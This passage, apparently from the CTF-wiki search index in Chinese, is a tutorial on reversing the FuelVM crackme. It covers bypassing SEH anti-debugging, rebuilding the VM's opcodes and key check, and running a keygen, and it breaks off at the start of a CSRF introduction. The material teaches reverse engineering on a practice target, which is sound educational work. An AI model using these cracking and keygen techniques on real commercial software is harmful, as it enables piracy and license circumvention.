\u8bf4\u5b9e\u8bdd, \u865a\u62df\u673a\u7684\u5206\u6790\u90e8\u5206\u662f\u4e00\u4e2a\u6bd4\u8f83\u67af\u71e5\u7684\u8fd8\u539f\u8fc7\u7a0b, \u4f60\u9700\u8981\u6bd4\u5bf9\u5404\u4e2a\u5c0f\u90e8\u5206\u7684\u64cd\u4f5c\u6765\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a\u600e\u6837\u7684\u6307\u4ee4, \u4f7f\u7528\u7684\u662f\u54ea\u4e9b\u5bc4\u5b58\u5668. \u50cf\u8fd9\u4e2acrackme\u4e2d, vm\u8fdb\u884c\u7684\u662f\u4e00\u4e2a \u53d6\u6307-\u8bd1\u7801-\u6267\u884c \u7684\u5faa\u73af. \u8bd1\u7801 \u8fc7\u7a0b\u53ef\u7ed9\u4e88\u6211\u4eec\u7684\u4fe1\u606f\u6700\u591a, \u4e0d\u540c\u7684\u6307\u4ee4\u90fd\u4f1a\u5728\u8fd9\u91cc, \u6839\u636e\u5b83\u4eec\u5404\u81ea\u7684 opcode , \u4f7f\u7528 if-else if-else \u5206\u652f\u8fdb\u884c\u533a\u5206. \u5b9e\u9645\u7684\u8fd8\u539f\u8fc7\u7a0b\u5e76\u4e0d\u590d\u6742, \u4f46\u6709\u53ef\u80fd\u4f1a\u56e0\u4e3a\u865a\u62df\u673a\u5b9e\u73b0\u7684\u6307\u4ee4\u6570\u91cf\u800c\u663e\u5f97\u6709\u4e9b\u4e4f\u5473. \u6700\u540e\u5206\u6790\u51fa\u7684\u7ed3\u679c\u5982\u4e0b: opcode value push 0x0a pop 0x0b mov 0x0c cmp 0x0d inc 0x0e dec 0x0f and 0x1b or 0x1c xor 0x1d check 0xff \u6211\u4eec\u518d\u6765\u770b\u5206\u6790\u540e\u7684 initVM \u51fd\u6570 int initVM () { int result ; // eax@1 r1 = 0 ; r2 = 0 ; r3 = 0 ; result = ( unsigned __int8 ) inputName [( unsigned __int8 ) cur_index ]; r4 = ( unsigned __int8 ) inputName [( unsigned __int8 ) cur_index ]; vm_sp = 0x32 ; vm_pc = 0 ; vm_flags_zf = 0 ; vm_flags_sf = 0 ; ++ cur_index ; return result ; } \u8fd9\u91cc\u67094\u4e2a\u901a\u7528\u5bc4\u5b58\u5668( r1/r2/r3/r4 ), 1\u4e2a sp \u6307\u9488\u548c1\u4e2a pc \u6307\u9488, \u6807\u5fd7 zf \u548c sf . \u5148\u524d\u6211\u4eec\u4e0d\u77e5\u9053\u7684 var_a \u4e5f\u88ab\u91cd\u547d\u540d\u4e3a cur_index , \u6307\u5411\u7684\u662f inputName \u5f53\u524d\u6b63\u5728\u5904\u7406\u7684\u5b57\u7b26\u7d22\u5f15. \u5bf9\u4e8eVM\u5b9e\u73b0\u7684\u591a\u4e2a\u6307\u4ee4\u6211\u4eec\u5c31\u4e0d\u518d\u591a\u8bf4, \u91cd\u70b9\u6765\u770b\u4e0b check \u90e8\u5206\u7684\u64cd\u4f5c. int __fastcall check ( int a1 ) { char v1 ; // al@1 int result ; // eax@4 v1 = r1 ; if ( ( unsigned __int8 ) r1 < 0x21u ) v1 = r1 + 0x21 ; LOBYTE ( a1 ) = cur_index ; if ( v1 == inputKey [ a1 ] ) { if ( ( unsigned __int8 ) cur_index >= ( unsigned __int8 ) lenOfName ) result = MessageBoxA ( 0 , aGoodJobNowWrit , Caption , 0 ); else result = initVM (); } else { result = MessageBoxA ( 0 , Text , Caption , 0 ); } return result ; } \u5982\u679c r1 \u4e2d\u7684\u503c\u8ddf inputKey[cur_index] \u76f8\u7b49, \u90a3\u4e48\u4f1a\u7ee7\u7eed\u5224\u65ad\u662f\u5426\u5df2\u7ecf\u68c0\u67e5\u5b8c\u4e86\u6574\u4e2a inputName , \u5982\u679c\u6ca1\u6709\u51fa\u9519\u4e14\u6bd4\u5bf9\u7ed3\u675f, \u90a3\u4e48\u5c31\u4f1a\u5f39\u51fa Good job! Now write a keygen. \u7684\u6d88\u606f\u6846. \u5426\u5219\u4f1a\u7ee7\u7eed initVM \u8fdb\u5165\u4e0b\u4e00\u8f6e\u5faa\u73af.(\u51fa\u9519\u4e86\u5f53\u7136\u662f\u5f39\u51fa\u6d88\u606f\u6846\u63d0\u793a\u9519\u8bef\u4e86. ) cur_index \u4f1a\u5728 initVM \u4e2d\u81ea\u589e1, \u90a3\u4e48\u8fd8\u8bb0\u5f97\u4e4b\u524d\u5728 process_input \u91cc\u6709\u6267\u884c2\u6b21 initVM \u5417. \u56e0\u4e3a\u6709\u6267\u884c2\u6b21 initVM , \u6240\u4ee5\u6211\u4eec\u7684 inputKey \u7684\u524d2\u4f4d\u53ef\u4ee5\u662f\u4efb\u610f\u5b57\u7b26. unk_4031CE = i ; opcode = vm_pc ; initVM (); initVM (); __debugbreak (); JUMPOUT ( * ( _DWORD * ) & word_4012CE ); \u6545\u800c\u6211\u4eec\u5206\u6790\u5b8c\u4e86\u6574\u4e2a\u865a\u62df\u673a, \u4fbf\u53ef\u4ee5\u5f00\u59cb\u7740\u624b\u7f16\u5199 Keygen . \u5bf9\u5e94\u7684 keygenme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: fuelvm_keygen.py $ python2 fuelvm_keygen.py ctf-wiki [ * ] Password for user 'ctf-wiki' is: 4mRC*TKJI \u5bf9\u5e94\u7684 IDA\u6570\u636e\u5e93 \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: FuelVM.idb","title":"\u865a\u62df\u673a\u6307\u4ee4\u5206\u6790"},{"location":"reverse/vm/vm/#_1","text":"\u6709\u5173\u865a\u62df\u673a\u5206\u6790\u90e8\u5206, \u6211\u4eec\u4ee5\u4e00\u9053\u7b80\u5355\u7684crackme\u6765\u8fdb\u884c\u8bb2\u89e3. \u5bf9\u5e94\u7684 crackme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: FuelVM.exe \u5bf9\u5e94\u7684 keygenme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: fuelvm_keygen.py \u5bf9\u5e94\u7684 IDA\u6570\u636e\u5e93 \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: FuelVM.idb \u672c\u9898\u4f5c\u8005\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u5177\u6709\u591a\u79cd\u6307\u4ee4\u7684\u7b80\u5355\u865a\u62df\u673a. \u6211\u4eec\u4f7f\u7528IDA\u6765\u8fdb\u884c\u5206\u6790. \u5e76\u4e3a\u4e86\u65b9\u4fbf\u8bb2\u89e3, \u6211\u5bf9\u53cd\u6c47\u7f16\u51fa\u7684\u4e00\u4e9b\u53d8\u91cf\u91cd\u65b0\u8fdb\u884c\u4e86\u547d\u540d.","title":"\u865a\u62df\u673a\u5206\u6790"},{"location":"reverse/vm/vm/#_2","text":"\u6211\u4eec\u8fd0\u884c\u7a0b\u5e8f FuelVM.exe. \u754c\u9762\u5982\u4e0b\u6240\u793a \u5728\u8fd9\u4e2a\u754c\u9762\u4e2d, \u6211\u4eec\u770b\u5230\u53f3\u4e24\u4e2a\u8f93\u5165\u6846, \u4e00\u4e2a\u7528\u4e8e\u8f93\u5165\u7528\u6237\u540dName, \u53e6\u4e00\u4e2a\u5219\u7528\u4e8e\u8f93\u5165\u5bc6\u94a5Key. \u8fd8\u6709\u4e24\u4e2a\u6309\u94ae, Go\u7528\u4e8e\u63d0\u4ea4\u8f93\u5165, \u800cExit\u5219\u7528\u4e8e\u9000\u51fa\u7a0b\u5e8f.","title":"\u8fd0\u884c\u7a0b\u5e8f"},{"location":"reverse/vm/vm/#_3","text":"\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u8fd9\u91cc\u5165\u624b. \u7a0b\u5e8f\u60f3\u83b7\u53d6\u7528\u6237\u8f93\u5165, \u9700\u8981\u8c03\u7528\u7684\u4e00\u4e2aAPI\u662f GetDlgItemTextA() UINT GetDlgItemTextA ( HWND hDlg , int nIDDlgItem , LPSTR lpString , int cchMax ); \u83b7\u53d6\u7684\u8f93\u5165\u5b57\u7b26\u4e32\u4f1a\u4fdd\u5b58\u5728 lpString \u91cc. \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6253\u5f00IDA\u67e5\u627e\u6709\u4ea4\u53c9\u5f15\u7528 GetDlgItemTextA() \u7684\u5730\u65b9. .text: 00401142 push 0 Ch ; cchMax .text : 00401144 push offset inputName ; lpString .text : 00401149 push 3 F8h ; nIDDlgItem .text : 0040114 E push [ ebp + hWnd ] ; hDlg .text : 00401151 call GetDlgItemTextA .text: 00401156 push 0 Ch ; cchMax .text : 00401158 push offset inputKey ; lpString .text : 0040115 D push 3 F9h ; nIDDlgItem .text : 00401162 push [ ebp + hWnd ] ; hDlg .text : 00401165 call GetDlgItemTextA .text: 0040116 A mov var_a , 0 .text: 00401171 call process_input .text: 00401176 jmp short locExit \u5982\u4e0a, IDA\u53ea\u6709\u8fd9\u91cc\u8c03\u7528\u8fc7 GetDlgItemTextA \u5e76\u4e14\u8c03\u7528\u4e86\u4e24\u6b21\u5206\u522b\u83b7\u53d6 inputName \u548c inputKey . \u968f\u540e\u521d\u59cb\u5316\u4e86\u4e00\u4e2a\u53d8\u91cf\u4e3a0, \u56e0\u4e3a\u8fd8\u4e0d\u660e\u767d\u8fd9\u4e2a\u53d8\u91cf\u7684\u4f5c\u7528, \u56e0\u6b64\u5148\u91cd\u547d\u540d\u4e3a var_a . \u4e4b\u540e\u8fdb\u884c\u4e86\u4e00\u6b21\u51fd\u6570\u8c03\u7528\u5e76jmp\u8df3\u8f6c. \u56e0\u4e3ajmp\u8df3\u8f6c\u4f4d\u7f6e\u7684\u4ee3\u7801\u662f\u4e00\u4e9b\u9000\u51fa\u7a0b\u5e8f\u7684\u4ee3\u7801, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u65ad\u5b9a\u4e0a\u9762\u7684\u8fd9\u4e2acall, \u662f\u5728\u8c03\u7528\u5904\u7406\u7528\u6237\u8f93\u5165\u7684\u51fd\u6570. \u56e0\u6b64\u5c06jmp\u7684\u4f4d\u7f6e\u91cd\u547d\u540d\u4e3a locExit , \u51fd\u6570\u5219\u91cd\u547d\u540d\u4e3a process_input .","title":"\u83b7\u53d6\u7528\u6237\u8f93\u5165"},{"location":"reverse/vm/vm/#_4","text":"\u6211\u4eec\u8fdb\u5165 process_input \u51fd\u6570, \u8be5\u51fd\u6570\u4ec5\u4ec5\u5bf9\u8f93\u5165\u5b57\u7b26\u4e32\u8fdb\u884c\u4e86\u5f88\u7b80\u5355\u7684\u5904\u7406. result = strlength (( int ) inputName ); if ( v1 >= 7 ) // v1 = length of inputName { * ( _DWORD * ) & lenOfName = v1 ; result = strlength (( int ) inputKey ); if ( v2 >= 7 ) // v2 = length of inputKey { i = 0 ; do { inputName [ i ] ^= i ; ++ i ; } while ( i <= * ( _DWORD * ) & lenOfName ); unk_4031CE = i ; dword_4031C8 = dword_4035FF ; initVM (); initVM (); __debugbreak (); JUMPOUT ( * ( _DWORD * ) & word_4012CE ); } } return result ; \u9996\u5148\u662f\u8fd9\u4e2a strlength() \u51fd\u6570. \u51fd\u6570\u4f7f\u7528 cld; repne scasb; not ecx; dec ecx \u6765\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u5e76\u5c06\u7ed3\u679c\u4fdd\u5b58\u5728 ecx \u91cc. \u662f\u6c47\u7f16\u57fa\u7840\u77e5\u8bc6\u5c31\u4e0d\u591a\u4ecb\u7ecd. \u6240\u4ee5\u6211\u4eec\u5c06\u8be5\u51fd\u6570\u91cd\u547d\u540d\u4e3a strlength .text: 004011 C2 arg_0 = dword ptr 8 .text: 004011 C2 .text: 004011 C2 push ebp .text: 004011 C3 mov ebp , esp .text: 004011 C5 mov edi , [ ebp + arg_0 ] .text: 004011 C8 sub ecx , ecx .text: 004011 CA sub al , al .text: 004011 CC not ecx .text: 004011 CE cld .text: 004011 CF repne scasb .text: 004011 D1 not ecx .text: 004011 D3 dec ecx .text: 004011 D4 leave .text: 004011 D5 retn 4 .text: 004011 D5 strlength endp \u800c\u5728IDA\u751f\u6210\u7684\u4f2aC\u4ee3\u7801\u5904\u6709 v1 \u548c v2 , \u6211\u5bf9\u5176\u8fdb\u884c\u4e86\u6ce8\u89e3, \u53ef\u4ee5\u770b\u6c47\u7f16, \u91cc\u9762\u662f\u4f7f\u7528 ecx \u4e0e 7 \u8fdb\u884c\u6bd4\u8f83, \u800c ecx \u662f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6, \u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u77e5\u9053, \u8fd9\u91cc\u5bf9\u8f93\u5165\u7684\u8981\u6c42\u662f: inputName \u548c inputKey \u7684\u957f\u5ea6\u5747\u4e0d\u5c11\u4e8e 7 \u5f53 inputName \u548c inputKey \u957f\u5ea6\u5747\u4e0d\u5c11\u4e8e7\u65f6, \u90a3\u4e48\u5c31\u53ef\u4ee5\u5bf9\u8f93\u5165\u8fdb\u884c\u7b80\u5355\u7684\u53d8\u6362. \u4ee5\u4e0b\u662f\u4e00\u4e2a\u5faa\u73af i = 0 ; do { inputName [ i ] ^= i ; ++ i ; } while ( i <= * ( _DWORD * ) & lenOfName ); \u5bf9\u5e94\u7684python\u4ee3\u7801\u5373 def obfuscate ( username ): s = \"\" for i in range ( len ( username )): s += chr ( ord ( username [ i ]) ^ i ) return s \u51fd\u6570\u4e4b\u540e\u5bf9\u4e00\u4e9b\u53d8\u91cf\u8fdb\u884c\u4e86\u8d4b\u503c(\u8fd9\u4e9b\u5e76\u4e0d\u91cd\u8981, \u5c31\u5ffd\u7565\u4e0d\u8bb2\u4e86.)","title":"\u5904\u7406\u7528\u6237\u8f93\u5165"},{"location":"reverse/vm/vm/#seh","text":".text: 004012 B5 push offset seh_handler .text: 004012 BA push large dword ptr fs : 0 .text: 004012 C1 mov large fs : 0 , esp .text: 004012 C8 call initVM .text: 004012 CD int 3 ; Trap to Debugger initVM \u5b8c\u6210\u7684\u662f\u4e00\u4e9b\u865a\u62df\u673a\u542f\u52a8\u524d\u7684\u521d\u59cb\u5316\u5de5\u4f5c(\u5176\u5b9e\u5c31\u662f\u5bf9\u4e00\u4e9b\u5bc4\u5b58\u5668\u548c\u76f8\u5173\u7684\u90e8\u5206\u8d4b\u521d\u503c), \u6211\u4eec\u4e4b\u540e\u6765\u8ba8\u8bba. \u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u7684\u662fSEH\u90e8\u5206. \u8fd9\u91cc\u6ce8\u518c\u4e86\u4e00\u4e2aSEH\u53e5\u67c4, \u5f02\u5e38\u5904\u7406\u51fd\u6570\u6211\u91cd\u547d\u540d\u4e3a seh_handler , \u5e76\u4e4b\u540e\u4f7f\u7528 int 3 \u624b\u52a8\u89e6\u53d1\u5f02\u5e38. \u800c\u5728 seh_handler \u4f4d\u7f6e, IDA\u5e76\u672a\u6b63\u786e\u8bc6\u522b\u51fa\u5bf9\u5e94\u7684\u4ee3\u7801 .text:004012D7 seh_handler db 64h ; DATA XREF: process_input+7D\u0018o .text:004012D8 dd 58Fh, 0C4830000h, 13066804h, 0FF640040h, 35h, 25896400h .text:004012D8 dd 0 .text:004012F4 dd 1B8h, 0F7C93300h, 0F7C033F1h, 0FFC483E1h, 8F64FDEBh .text:004012F4 dd 5, 4C48300h, 40133068h, 35FF6400h, 0 .text:0040131C dd 258964h, 33000000h, 33198BC9h, 83E1F7C0h, 0FDEBFFC4h .text:0040131C dd 58F64h, 83000000h, 5E6804C4h, 64004013h, 35FFh, 89640000h .text:0040131C dd 25h, 0C033CC00h, 0C483E1F7h, 83FDEBFFh, 4035FF05h, 0D8B0200h .text:0040131C dd 4035FFh, 3000B1FFh, 58F0040h, 4031C8h, 31C83D80h, 750A0040h .text:0040131C dd 0B1FF4176h, 403000h, 31C8058Fh, 3D800040h, 4031C8h \u6211\u4eec\u53ef\u4ee5\u70b9\u51fb\u76f8\u5e94\u4f4d\u7f6e\u6309\u4e0b c \u952e, \u5c06\u8fd9\u4e9b\u6570\u636e\u8f6c\u6362\u6210\u4ee3\u7801\u8fdb\u884c\u8bc6\u522b. (\u6211\u4eec\u9700\u8981\u6309\u4e0b\u591a\u6b21c\u952e\u8fdb\u884c\u8f6c\u6362), \u5f97\u5230\u5982\u4e0b\u4ee3\u7801. \u5982\u4e0b, \u5728 seh_handler \u4f4d\u7f6e, \u53c8\u7528\u7c7b\u4f3c\u7684\u65b9\u6cd5\u6ce8\u518c\u4e86\u4e00\u4e2a\u4f4d\u4e8e 401306h \u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570, \u5e76\u901a\u8fc7 xor ecx,ecx; div ecx \u624b\u52a8\u89e6\u53d1\u4e86\u4e00\u4e2a \u96640\u5f02\u5e38 . \u800c\u5728 loc_401301 \u4f4d\u7f6e, \u8fd9\u662f\u4e00\u4e2a\u53cd\u8c03\u8bd5\u6280\u5de7, jmp loc_401301+2 \u4f1a\u4f7f\u5f97 EIP \u8f6c\u5411\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4, \u4f7f\u5f97\u65e0\u6cd5\u7ee7\u7eed\u8c03\u8bd5. \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06 00401301~00401306 \u90e8\u5206\u7684\u4ee3\u7801 nop \u6389, \u7136\u540e\u5728 00401306 \u4f4d\u7f6e\u521b\u5efa\u4e00\u4e2a\u65b0\u51fd\u6570 seh_handler2 seh_handler: ; DATA XREF: process_input+7D\u0018o .text:004012D7 pop large dword ptr fs:0 .text:004012DE add esp, 4 .text:004012E1 push 401306h .text:004012E6 push large dword ptr fs:0 .text:004012ED mov large fs:0, esp .text:004012F4 mov eax, 1 .text:004012F9 xor ecx, ecx .text:004012FB div ecx .text:004012FD xor eax, eax .text:004012FF mul ecx .text:00401301 .text:00401301 loc_401301: ; CODE XREF: .text:00401304\u0019j .text:00401301 add esp, 0FFFFFFFFh .text:00401304 jmp short near ptr loc_401301+2 .text:00401306 ; --------------------------------------------------------------------------- .text:00401306 pop large dword ptr fs:0 .text:0040130D add esp, 4 .text:00401310 push 401330h .text:00401315 push large dword ptr fs:0 .text:0040131C mov large fs:0, esp .text:00401323 xor ecx, ecx .text:00401325 mov ebx, [ecx] .text:00401327 xor eax, eax .text:00401329 mul ecx \u7c7b\u4f3c\u7684, \u8fd8\u6709 401330h \u91cd\u547d\u540d\u4e3a seh_handler3 , \u800c 40135Eh \u662f\u6700\u540e\u4e00\u4e2a\u6ce8\u518c\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570, \u6211\u4eec\u53ef\u4ee5\u63a8\u6d4b\u8fd9\u624d\u662f\u865a\u62df\u673a\u771f\u6b63\u7684main\u51fd\u6570, \u56e0\u6b64\u6211\u4eec\u5c06 40135Eh \u91cd\u547d\u540d\u4e3a vm_main . (\u6709\u5173SEH\u548c\u53cd\u8c03\u8bd5\u7684\u90e8\u5206, \u53ef\u4ee5\u63a8\u8350\u5927\u5bb6\u81ea\u5df1\u53bb\u52a8\u6001\u8c03\u8bd5\u4e00\u756a\u5f04\u6e05\u695a)","title":"\u6ce8\u518cSEH"},{"location":"reverse/vm/vm/#_5","text":"\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a vm_main \u51fd\u6570(\u91cd\u547d\u540d\u540e\u8fd8\u9700\u8981\u521b\u5efa\u51fd\u6570, IDA\u624d\u80fd\u8bc6\u522b), \u7136\u540e\u6309\u4e0b F5 \u63d0\u793a\u5931\u8d25, \u5931\u8d25\u7684\u539f\u56e0\u5219\u662f\u7531\u4e8e\u5806\u6808\u4e0d\u5e73\u8861\u5bfc\u81f4\u7684. \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u70b9\u51fbIDA\u83dc\u5355\u9879 Options->General \u5728\u53f3\u4fa7\u52fe\u9009 stack pointer . \u8fd9\u6837\u5c31\u4f1a\u663e\u793a\u51fa\u5bf9\u5e94\u7684\u6808\u6307\u9488. .text:004017F2 000 jmp vm_main .text:004017F7 ; --------------------------------------------------------------------------- .text:004017F7 000 push 0 ; uType .text:004017F9 004 push offset aError ; \"Error\" .text:004017FE 008 push offset Text ; \"The key is wrong.\" .text:00401803 00C push 0 ; hWnd .text:00401805 010 call MessageBoxA .text:0040180A .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text:0040180A 000 leave .text:0040180B -04 leave .text:0040180C -08 leave .text:0040180D -0C leave .text:0040180E -10 leave .text:0040180F -14 leave .text:00401810 -18 leave .text:00401811 -1C retn .text:00401811 vm_main endp ; sp-analysis failed \u6211\u4eec\u6765\u5230\u6700\u4e0b\u663e\u793a\u4e0d\u5e73\u8861\u7684\u4f4d\u7f6e. \u6700\u4e0a\u7684 jmp vm_main \u8868\u660e\u865a\u62df\u673a\u5185\u5728\u6267\u884c\u4e00\u4e2a\u5faa\u73af. \u800c MessageBoxA \u7684\u8c03\u7528\u5219\u662f\u663e\u793a\u6700\u540e\u5f39\u51fa\u7684\u9519\u8bef\u4fe1\u606f. \u800c\u5728 locret_40180A \u4f4d\u7f6e\u5904, \u7ecf\u8fc7\u591a\u6b21leave\u5806\u6808\u4e25\u91cd\u4e0d\u5e73\u8861, \u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u52a8\u6062\u590d\u5806\u6808\u5e73\u8861. \u8fd9\u91cc\u4e5f\u5f88\u7b80\u5355, \u5728 0040180A \u4f4d\u7f6e\u5df2\u7ecf\u5806\u6808\u5e73\u8861\u4e86(000), \u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5c06\u8fd9\u4e00\u53e5 leave \u4fee\u6539\u4e3a retn \u5c31\u53ef\u4ee5\u4e86. \u5982\u4e0b\u8fd9\u6837 .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text:0040180A 000 retn .text:0040180B ; --------------------------------------------------------------------------- .text:0040180B 004 leave .text:0040180C 004 leave .text:0040180D 004 leave \u7136\u540e\u4f60\u5c31\u53ef\u4ee5\u53d1\u73b0 vm_main \u53ef\u4ee5F5\u751f\u6210\u4f2aC\u4ee3\u7801\u4e86.","title":"\u6062\u590d\u5806\u6808\u5e73\u8861"},{"location":"reverse/vm/vm/#_6","text":"\u8bf4\u5b9e\u8bdd, \u865a\u62df\u673a\u7684\u5206\u6790\u90e8\u5206\u662f\u4e00\u4e2a\u6bd4\u8f83\u67af\u71e5\u7684\u8fd8\u539f\u8fc7\u7a0b, \u4f60\u9700\u8981\u6bd4\u5bf9\u5404\u4e2a\u5c0f\u90e8\u5206\u7684\u64cd\u4f5c\u6765\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a\u600e\u6837\u7684\u6307\u4ee4, \u4f7f\u7528\u7684\u662f\u54ea\u4e9b\u5bc4\u5b58\u5668. \u50cf\u8fd9\u4e2acrackme\u4e2d, vm\u8fdb\u884c\u7684\u662f\u4e00\u4e2a \u53d6\u6307-\u8bd1\u7801-\u6267\u884c \u7684\u5faa\u73af. \u8bd1\u7801 \u8fc7\u7a0b\u53ef\u7ed9\u4e88\u6211\u4eec\u7684\u4fe1\u606f\u6700\u591a, \u4e0d\u540c\u7684\u6307\u4ee4\u90fd\u4f1a\u5728\u8fd9\u91cc, \u6839\u636e\u5b83\u4eec\u5404\u81ea\u7684 opcode , \u4f7f\u7528 if-else if-else \u5206\u652f\u8fdb\u884c\u533a\u5206. \u5b9e\u9645\u7684\u8fd8\u539f\u8fc7\u7a0b\u5e76\u4e0d\u590d\u6742, \u4f46\u6709\u53ef\u80fd\u4f1a\u56e0\u4e3a\u865a\u62df\u673a\u5b9e\u73b0\u7684\u6307\u4ee4\u6570\u91cf\u800c\u663e\u5f97\u6709\u4e9b\u4e4f\u5473. \u6700\u540e\u5206\u6790\u51fa\u7684\u7ed3\u679c\u5982\u4e0b: opcode value push 0x0a pop 0x0b mov 0x0c cmp 0x0d inc 0x0e dec 0x0f and 0x1b or 0x1c xor 0x1d check 0xff \u6211\u4eec\u518d\u6765\u770b\u5206\u6790\u540e\u7684 initVM \u51fd\u6570 int initVM () { int result ; // eax@1 r1 = 0 ; r2 = 0 ; r3 = 0 ; result = ( unsigned __int8 ) inputName [( unsigned __int8 ) cur_index ]; r4 = ( unsigned __int8 ) inputName [( unsigned __int8 ) cur_index ]; vm_sp = 0x32 ; vm_pc = 0 ; vm_flags_zf = 0 ; vm_flags_sf = 0 ; ++ cur_index ; return result ; } \u8fd9\u91cc\u67094\u4e2a\u901a\u7528\u5bc4\u5b58\u5668( r1/r2/r3/r4 ), 1\u4e2a sp \u6307\u9488\u548c1\u4e2a pc \u6307\u9488, \u6807\u5fd7 zf \u548c sf . \u5148\u524d\u6211\u4eec\u4e0d\u77e5\u9053\u7684 var_a \u4e5f\u88ab\u91cd\u547d\u540d\u4e3a cur_index , \u6307\u5411\u7684\u662f inputName \u5f53\u524d\u6b63\u5728\u5904\u7406\u7684\u5b57\u7b26\u7d22\u5f15. \u5bf9\u4e8eVM\u5b9e\u73b0\u7684\u591a\u4e2a\u6307\u4ee4\u6211\u4eec\u5c31\u4e0d\u518d\u591a\u8bf4, \u91cd\u70b9\u6765\u770b\u4e0b check \u90e8\u5206\u7684\u64cd\u4f5c. int __fastcall check ( int a1 ) { char v1 ; // al@1 int result ; // eax@4 v1 = r1 ; if ( ( unsigned __int8 ) r1 < 0x21u ) v1 = r1 + 0x21 ; LOBYTE ( a1 ) = cur_index ; if ( v1 == inputKey [ a1 ] ) { if ( ( unsigned __int8 ) cur_index >= ( unsigned __int8 ) lenOfName ) result = MessageBoxA ( 0 , aGoodJobNowWrit , Caption , 0 ); else result = initVM (); } else { result = MessageBoxA ( 0 , Text , Caption , 0 ); } return result ; } \u5982\u679c r1 \u4e2d\u7684\u503c\u8ddf inputKey[cur_index] \u76f8\u7b49, \u90a3\u4e48\u4f1a\u7ee7\u7eed\u5224\u65ad\u662f\u5426\u5df2\u7ecf\u68c0\u67e5\u5b8c\u4e86\u6574\u4e2a inputName , \u5982\u679c\u6ca1\u6709\u51fa\u9519\u4e14\u6bd4\u5bf9\u7ed3\u675f, \u90a3\u4e48\u5c31\u4f1a\u5f39\u51fa Good job! Now write a keygen. \u7684\u6d88\u606f\u6846. \u5426\u5219\u4f1a\u7ee7\u7eed initVM \u8fdb\u5165\u4e0b\u4e00\u8f6e\u5faa\u73af.(\u51fa\u9519\u4e86\u5f53\u7136\u662f\u5f39\u51fa\u6d88\u606f\u6846\u63d0\u793a\u9519\u8bef\u4e86. ) cur_index \u4f1a\u5728 initVM \u4e2d\u81ea\u589e1, \u90a3\u4e48\u8fd8\u8bb0\u5f97\u4e4b\u524d\u5728 process_input \u91cc\u6709\u6267\u884c2\u6b21 initVM \u5417. \u56e0\u4e3a\u6709\u6267\u884c2\u6b21 initVM , \u6240\u4ee5\u6211\u4eec\u7684 inputKey \u7684\u524d2\u4f4d\u53ef\u4ee5\u662f\u4efb\u610f\u5b57\u7b26. unk_4031CE = i ; opcode = vm_pc ; initVM (); initVM (); __debugbreak (); JUMPOUT ( * ( _DWORD * ) & word_4012CE ); \u6545\u800c\u6211\u4eec\u5206\u6790\u5b8c\u4e86\u6574\u4e2a\u865a\u62df\u673a, \u4fbf\u53ef\u4ee5\u5f00\u59cb\u7740\u624b\u7f16\u5199 Keygen . \u5bf9\u5e94\u7684 keygenme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: fuelvm_keygen.py $ python2 fuelvm_keygen.py ctf-wiki [ * ] Password for user 'ctf-wiki' is: 4mRC*TKJI \u5bf9\u5e94\u7684 IDA\u6570\u636e\u5e93 \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: FuelVM.idb","title":"\u865a\u62df\u673a\u6307\u4ee4\u5206\u6790"},{"location":"web/csrf/","text":"CSRF \u7b80\u4ecb \u00b6 CSRF\uff0c\u5168\u540d Cross Site Request Forgery\uff0c\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002\u5f88\u5bb9\u6613\u5c06\u5b83\u4e0e XSS \u6df7\u6dc6\uff0c\u5bf9\u4e8e CSRF\uff0c\u5176\u4e24\u4e2a\u5173\u952e\u70b9\u662f\u8de8\u7ad9\u70b9\u7684\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u7684\u4f2a\u9020\uff0c\u7531\u4e8e\u76ee\u6807\u7ad9\u65e0 token \u6216 referer \u9632\u5fa1\uff0c\u5bfc\u81f4\u7528\u6237\u7684\u654f\u611f\u64cd\u4f5c\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u83b7\u77e5\uff0c\u653b\u51fb\u8005\u5373\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u4e00\u6837\u7684\u8bf7\u6c42\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u8fbe\u5230\u6076\u610f\u76ee\u7684\u3002 CSRF \u7c7b\u578b \u00b6 \u6309\u8bf7\u6c42\u7c7b\u578b\uff0c\u53ef\u5206\u4e3a GET \u578b\u548c POST \u578b\u3002 \u6309\u653b\u51fb\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a HTML CSRF\u3001JSON HiJacking\u3001Flash CSRF \u7b49\u3002 HTML CSRF \u00b6 \u5229\u7528 HTML \u5143\u7d20\u53d1\u51fa CSRF \u8bf7\u6c42\uff0c\u8fd9\u662f\u6700\u5e38\u89c1\u7684 CSRF \u653b\u51fb\u3002 HTML \u4e2d\u80fd\u8bbe\u7f6e src/href 